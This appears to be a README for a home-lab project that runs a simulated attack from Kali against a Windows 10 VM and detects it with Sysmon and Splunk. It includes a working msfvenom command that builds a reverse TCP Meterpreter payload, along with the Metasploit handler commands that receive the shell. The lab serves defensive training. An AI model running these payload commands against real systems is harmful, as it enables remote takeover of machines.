# Windows & Kali Incident Response Lab

This project simulates a realistic internal network attack in an isolated home lab environment. It demonstrates hands-on incident response techniques using Splunk, Sysmon, and attacker tools such as Nmap and Metasploit — covering the entire workflow from attack execution to detection and documentation.

## Lab Overview

- **Environment:** Oracle VirtualBox
- **Virtual Machines:**
  - Windows 10 (Target System)
  - Kali Linux (Attacker System)
- **Tools Used:**
  - Splunk Enterprise
  - Splunk Universal Forwarder
  - Sysmon (via MyDFIR config)
  - Nmap
  - Metasploit / msfvenom
- **Network Setup:** Internal NAT-only network with manually assigned static IPs

## Objectives

- Deploy Windows and Kali VMs on an isolated network
- Configure Splunk Universal Forwarder on Windows 10
- Install and tune Sysmon for endpoint telemetry
- Simulate cyber attacks using:
  - Nmap for reconnaissance
  - msfvenom and Metasploit for payload generation and exploitation
- Detect and analyze adversary activity in Splunk
- Troubleshoot log forwarding and network connectivity
- Document all phases with professional structure


## Lab Architecture

Windows 10 VM <-> Kali Linux VM (VirtualBox internal network)

- Sysmon installed on Windows 10 for detailed event logging
- Splunk Universal Forwarder collects local logs
- Logs are forwarded to Splunk Enterprise running externally or on localhost

## Setup and Configuration

### Sysmon Deployment

Installed Sysmon using PowerShell and the MyDFIR configuration file:

    sysmon.exe -i SysmonConfig.xml

### Splunk Input Configuration

Custom `input.conf` used on the Universal Forwarder to ingest logs:

    [WinEventLog://Security]
    disabled = 0

    [WinEventLog://Microsoft-Windows-Sysmon/Operational]
    disabled = 0

    [WinEventLog://System]
    disabled = 0

    [WinEventLog://Application]
    disabled = 0

    [WinEventLog://Windows PowerShell]
    disabled = 0

### Network Configuration

- Internal-only VirtualBox network
- Static IPs manually assigned to both VMs
- Firewall rules adjusted to allow:
  - ICMP (ping)
  - Inbound connections for testing payloads

## Attack Simulation

### 1. Reconnaissance

Performed an Nmap scan from Kali targeting the Windows VM:

    nmap -A 192.168.56.10 -Pn

No ports were open externally, demonstrating basic system hardening.

### 2. Payload Creation and Delivery

Created a reverse TCP Meterpreter shell using `msfvenom`:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.20 LPORT=4444 -f exe -o shell.exe

Delivered the payload via a Python HTTP server and downloaded it on Windows using `Invoke-WebRequest`.

### 3. Exploitation

Payload execution triggered a reverse shell back to Metasploit:

    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.56.20
    set LPORT 4444
    run

## Detection and Analysis

- All attacker behavior was logged and indexed in Splunk
- Investigated via dashboards and custom SPL queries
- Visibility included:
  - Process creation (`Event ID 1`)
  - Network connections (`Event ID 3`)
  - Image loads and script executions

## Troubleshooting

- **Connectivity Issues:** Resolved by configuring the correct internal adapter type and static IPs
- **Missing Logs:** Corrected input stanza in `input.conf` and restarted the Splunk Forwarder
- **Payload Failures:** Ensured firewall allowed connections and ran as administrator

## Lessons Learned

- Built a complete detection lab using enterprise-grade tools
- Understood red and blue team tactics within a single exercise
- Gained experience correlating adversary activity with defensive telemetry
- Improved system hardening and investigation techniques through iteration
- Validated Sysmon and Splunk integration in a live attack simulation
